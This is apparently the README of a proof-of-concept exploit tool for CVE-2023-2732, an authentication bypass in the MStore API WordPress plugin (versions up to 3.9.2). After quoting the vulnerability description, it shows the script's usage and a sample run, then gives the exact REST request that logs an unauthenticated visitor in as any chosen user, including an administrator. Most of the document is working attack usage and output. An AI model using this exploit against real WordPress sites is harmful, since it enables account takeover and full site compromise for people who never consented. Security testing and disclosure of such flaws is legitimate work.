# CVE-2023-2732


### MStore API &lt;= 3.9.2 - Authentication Bypass

[https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/mstore-api/mstore-api-392-authentication-bypass](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/mstore-api/mstore-api-392-authentication-bypass)


Description
---

```
The MStore API plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 3.9.2. This is due to insufficient verification on the user being supplied during the add listing REST API request through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the user id.

```




Help
----

```
usage: mstore-api.py [-h] -u URL

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  URL of the WordPress site
````

Example Usage
----

```
python3 mstore-api.py -u http://wordpress.lan


The plugin version is below 3.9.3.
Select a user:
1. admin
Enter the user ID: 1



Congratulations a vulnerable system has been found.

How to Exploit:

Visit the following url: http://wordpress.lan/wp-json/wp/v2/add-listing?id=1
Visit  http://wordpress.lan and you should be logged in as the user you have chosen.
```
